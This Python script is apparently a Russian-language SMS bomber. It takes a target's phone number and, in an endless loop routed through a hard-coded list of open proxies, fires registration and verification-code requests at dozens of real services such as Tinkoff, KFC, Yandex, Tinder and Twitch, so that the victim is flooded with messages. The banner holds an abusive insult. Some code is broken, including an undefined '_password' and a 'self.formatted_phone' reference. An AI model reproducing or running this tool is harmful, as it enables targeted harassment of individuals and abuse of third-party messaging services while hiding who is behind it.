import requests, random, datetime, sys, time, argparse, os
from colorama import Fore, Back, Style
from bs4 import BeautifulSoup as bs

proxies = { 
                "http": "http://1.10.188.5:8080",
                "http": "http://1.20.152.239:8080",
                "http": "http://1.10.186.35:37235",
                "http": "http://1.20.101.24:51681",
                "http": "http://1.20.210.228:8080",
                "http": "http://1.160.126.97:80",
                "http": "http://1.20.99.122:8080",
                "http": "http://1.70.66.41:9999",
                "http": "http://114.99.9.138:3000",
                "http": "http://114.103.20.198:4216",
                "http": "http://117.120.58.1:41132",
                "http": "http://115.85.65.94:8080",
                "http": "http://114.6.87.177:60811",
                "http": "http://117.131.119.116:80",
                "http": "http://117.69.231.75:9999",
                "http": "http://114.104.18.29:4216",
                "http": "http://13.251.221.173:8080",
                "http": "http://128.199.202.122:8080",
                "http": "http://128.199.202.122:3128",
            }
banner = """
-
- У НЕЖДАНА               v0.01
- СДОХЛА                  Введите номер что бы продолжить:
- МАМА
- ПОМЯНЕМ
-
"""

print(banner)
_phone = input('+')

if _phone[0] == '+':
    _phone = _phone[1:]
if _phone[0] == '8':
    _phone = '7'+_phone[1:]
if _phone[0] == '9':
    _phone = '7'+_phone

_name = ''
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneAv = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

iteration = 0
while True:
    _email = _name+f'{iteration}'+'@gmail.com'
    email = _name+f'{iteration}'+'@gmail.com'
    try:
        requests.post("https://oauth.av.ru/check-phone",
            json={"phone": _phoneAv}, proxies=proxies)
        print('+ // AV отпрвлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post("https://api.imgur.com/account/v1/phones/verify",
            json={"phone_number": _phone, "region_code": "BY"}, proxies=proxies)
        print('+ // IMGUR BY!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post("https://api.imgur.com/account/v1/phones/verify",
            json={"phone_number": _phone, "region_code": "RU"}, proxies=proxies)
        print('+ // IMGUR RU!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone}, proxies=proxies)
        print('+ // MonoBank отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                          json={"Phone": _phone, "Type": 1}, proxies=proxies)
        print('+ // KinoLand отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post('https://www.moyo.ua/identity/registration',
                          data={"firstname": _name, "phone": _phone, "email": _email}, proxies=proxies)
        print('+ // Moyo отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post('https://uklon.com.ua/api/v1/account/code/send',
                          headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone}, proxies=proxies)
        print('+ // UKlon отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone}, proxies=proxies)
        print('+ // MyGames отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password}, proxies=proxies)
        print('+ // EasyPay отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone}, proxies=proxies)
        print('+ // KFC отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post('https://ggbet.ru/api/auth/register-with-phone',
                          data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on",
                                "oferta": "on", }, proxies=proxies)
        print('+ // GGBet отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={}, proxies=proxies)
        print('+ // МТС отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={}, proxies=proxies)
        print('+ // Tinkoff отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'}, proxies=proxies)
        print('+ // Grab отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post("https://api.sunlight.net/v3/customers/authorization/",
            data={"phone": _phone}, proxies=proxies)
        print('+ // SunLight отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate",
            json={"phone": _phone9}, proxies=proxies)
        print('+ // IqOS отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post("https://plink.tech/register/", json={"phone": _phone}, proxies=proxies)
        print('+ // Plink.tech отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    
    try:
        requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
            params={"pageName": "registerPrivateUserPhoneVerificatio"}, proxies=proxies)
        print('+ // MVideo отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    
    try:
        requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",
            data={"msisdn": _phone},
            headers={"App-ID": "cabinet"}, proxies=proxies)
        print('+ // wi-fi.ru отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post("https://api.tinkoff.ru/v1/sign_up",
            data={"phone": "+" + _phone}, proxies=proxies)
        print('+ // ube.pmsm.org.ru отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
            json={"phone": "+" + _phone}, proxies=proxies)
        print('+ // KFC отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post("https://eda.yandex/api/v1/user/request_authentication_code",
            json={"phone_number": "+" + _phone}, proxies=proxies)
        print('+ // Yandex.Eda отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post("https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}, proxies=proxies)
        print('+ // Yandec.Chef отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone}, proxies=proxies)
        print('+ // ube.pmsm.org.ru отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post('https://findclone.ru/register', params={'phone': '+' + _phone}, proxies=proxies)
        print('+ // FindClone call отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
            json={"phone": _phone, "otpId": 0}
        )
        print('+ // Ozon отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
            data={
                "mode": "request",
                "phone": "+" + _phone,
                "phone_permission": "unknown",
                "stream_id": 0,
                "v": 3,
                "appversion": "3.20.6",
                "osversion": "unknown",
                "devicemodel": "unknown",
            }, proxies=proxies)
        print('+ // InDriver отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    
    try:
        requests.post("https://cloud.mail.ru/api/v2/notify/applink",
            json={
                "phone": "+" + _phone,
                "api": 2,
                "email": "email",
                "x-email": "x-email",
            }, proxies=proxies)
        print('+ // MailCloud отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    
    
    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone}, proxies=proxies)
        print('+ // List отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    
    try:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + _phone}, proxies=proxies)
        print('+ // Lenta отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')

    try:
        requests.post('https://b.utair.ru/api/v1/login/',
       data = {'login': _phone},
       headers = {
       'Accept-Language':'en-US,en;q=0.5',
       'Connection':'keep-alive',
       'Host':'b.utair.ru',
       'origin':'https://www.utair.ru',
       'Referer':'https://www.utair.ru/'}, proxies=proxies)
       
        print('+ // Utair отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post('https://b.utair.ru/api/v1/login/',
       data = {'login': _phone},
       headers = {
       'Accept-Language':'en-US,en;q=0.5',
       'Connection':'keep-alive',
       'Host':'b.utair.ru',
       'origin':'https://www.utair.ru',
       'Referer':'https://www.utair.ru/'}, proxies=proxies)
       
        print('+ // Utair отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post('https://b.utair.ru/api/v1/login/',
       data = {'login': _phone},
       headers = {
       'Accept-Language':'en-US,en;q=0.5',
       'Connection':'keep-alive',
       'Host':'b.utair.ru',
       'origin':'https://www.utair.ru',
       'Referer':'https://www.utair.ru/'}, proxies=proxies)
       
        print('+ // Utair отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')
    try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data = {'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'}, proxies=proxies)
        print('+ // Grab отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={}, proxies=proxies)
        print('+ // Tinder отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')

    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={}, proxies=proxies)
        print('+ // Tinkoff отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')


    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone}, proxies=proxies)
        print('+ // Youla отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')

    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone}, proxies=proxies)
        print('+ // Rutube отправлен запрос!')
    except:
        print('+ // Не отправлен запрос!')


    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone}, proxies=proxies)
        print('+ // Beltelcom отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')


    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone}, proxies=proxies)
        print('+ // KFC отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')


    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, proxies=proxies)
        print('+ // ICQ отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')

    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone}, proxies=proxies)
        print('+ // Invitro отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')


    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone}, proxies=proxies)
        print('+ // IVI отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')

    try:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone}, proxies=proxies)
        print('+ // Lenta отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"}, proxies=proxies)
        print('+ // Mail.ru отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')


    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone}, proxies=proxies)
        print('+ // OK отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')


    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone}, proxies=proxies)
        print('+ // Tinder отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')

    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username}, proxies=proxies)
        print('+ // Twitch отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')

    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone}, proxies=proxies)
        print('+ // Eda.Yandex отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone}, proxies=proxies)
        print('+ // Youla отправлен запрос!')
    except:
        print('- // Не отправлен запрос!')


    try:
        iteration += 1
        print(('{} круг пройден.').format(iteration))
    except:
        break